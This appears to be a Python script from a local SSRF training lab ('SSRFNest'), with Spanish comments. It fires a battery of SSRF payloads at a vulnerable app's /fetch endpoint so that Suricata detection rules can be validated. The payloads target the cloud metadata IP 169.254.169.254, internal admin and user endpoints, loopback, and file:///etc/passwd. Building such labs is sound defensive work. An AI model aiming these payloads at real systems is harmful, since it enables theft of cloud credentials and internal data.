#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
attack_demo.py — Batería de payloads SSRF contra SSRFNest (VulnApp).

Autor: Javier Garrido Ortiz

Este script lanza una secuencia de peticiones SSRF contra el endpoint
/fetch de la VulnApp con el objetivo de poblar los logs de Suricata y
permitir al analista Blue Team validar sus reglas y su detector.

*** SOLO PARA USO EN LABORATORIO LOCAL EDUCATIVO ***

Uso:
    python scripts/attack_demo.py --target http://localhost:8080
"""

from __future__ import annotations

import argparse
import sys
import time
from typing import Iterable

import requests

# Cabecera de aviso ético que se imprime al arrancar el script.
BANNER = (
    "*********************************************************\n"
    "*** SOLO PARA USO EN LABORATORIO LOCAL EDUCATIVO      ***\n"
    "*** No ejecutar contra sistemas sin autorización      ***\n"
    "*********************************************************"
)

# Pausa entre peticiones para no saturar la VulnApp ni Suricata.
DELAY_SECONDS = 0.5

# Timeout de cada petición HTTP en segundos.
REQUEST_TIMEOUT = 10

# Longitud máxima del cuerpo de respuesta que se imprime por pantalla.
BODY_PREVIEW_CHARS = 200

# Lista de payloads SSRF que se van a probar contra la VulnApp.
# El orden es intencionado: primero los que apuntan a servicios internos
# del laboratorio, luego loopback y esquemas alternativos.
PAYLOADS: list[dict[str, str]] = [
    {
        "name": "metadata-imdsv1",
        "url": "http://169.254.169.254/latest/meta-data/",
        "description": "Endpoint IMDSv1 simulado (link-local AWS)",
    },
    {
        "name": "metadata-internal",
        "url": "http://172.20.0.10:9000/latest/meta-data/",
        "description": "Servicio de metadatos interno del lab",
    },
    {
        "name": "admin-panel",
        "url": "http://172.20.0.11:9001/admin",
        "description": "Panel de administración interno",
    },
    {
        "name": "loopback",
        "url": "http://127.0.0.1/",
        "description": "Acceso a loopback desde el servidor",
    },
    {
        "name": "file-scheme",
        "url": "file:///etc/passwd",
        "description": "Lectura de fichero local vía esquema file://",
    },
    {
        "name": "admin-credentials",
        "url": "http://172.20.0.11:9001/users",
        "description": "Enumeración de usuarios del panel admin",
    },
]


def build_fetch_url(target: str, payload_url: str) -> str:
    """Construye la URL del endpoint /fetch con el payload embebido."""
    base = target.rstrip("/")
    return f"{base}/fetch"


def run_payload(
    session: requests.Session,
    target: str,
    payload: dict[str, str],
) -> dict[str, object]:
    """Ejecuta un único payload SSRF y devuelve un resumen del resultado."""
    fetch_url = build_fetch_url(target, payload["url"])
    params = {"url": payload["url"]}

    print(f"[*] Ataque      : {payload['name']}")
    print(f"    Descripción : {payload['description']}")
    print(f"    Payload URL : {payload['url']}")
    print(f"    GET         : {fetch_url}?url={payload['url']}")

    result: dict[str, object] = {
        "name": payload["name"],
        "payload_url": payload["url"],
        "status_code": None,
        "error": None,
    }

    try:
        response = session.get(
            fetch_url,
            params=params,
            timeout=REQUEST_TIMEOUT,
        )
        body_preview = response.text[:BODY_PREVIEW_CHARS]
        result["status_code"] = response.status_code
        print(f"    HTTP status : {response.status_code}")
        print(f"    Body (200c) : {body_preview!r}")
    except requests.RequestException as exc:
        result["error"] = str(exc)
        print(f"    ERROR       : {exc}")

    print()
    return result


def iter_payloads() -> Iterable[dict[str, str]]:
    """Itera los payloads definidos, manteniendo el orden original."""
    for payload in PAYLOADS:
        yield payload


def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    """Parsea los argumentos de línea de comandos."""
    parser = argparse.ArgumentParser(
        description=(
            "Batería de payloads SSRF contra SSRFNest. "
            "Solo para uso en laboratorio local educativo."
        )
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8080",
        help="URL base de la VulnApp expuesta por Nginx (default: %(default)s)",
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=DELAY_SECONDS,
        help="Segundos de espera entre peticiones (default: %(default)s)",
    )
    return parser.parse_args(argv)


def main(argv: list[str] | None = None) -> int:
    """Punto de entrada del script."""
    args = parse_args(argv)

    print(BANNER)
    print(f"[+] Target     : {args.target}")
    print(f"[+] Delay      : {args.delay}s")
    print(f"[+] Payloads   : {len(PAYLOADS)}")
    print()

    session = requests.Session()
    session.headers.update({"User-Agent": "SSRFNest-AttackDemo/1.0"})

    results: list[dict[str, object]] = []
    for payload in iter_payloads():
        results.append(run_payload(session, args.target, payload))
        # Pequeña pausa para que Suricata registre cada evento por separado.
        time.sleep(args.delay)

    ok = sum(1 for r in results if r.get("status_code") is not None)
    print(f"[+] Fin de la batería. Peticiones completadas: {ok}/{len(results)}")
    print("[+] Revisa suricata/logs/eve.json para las alertas generadas.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
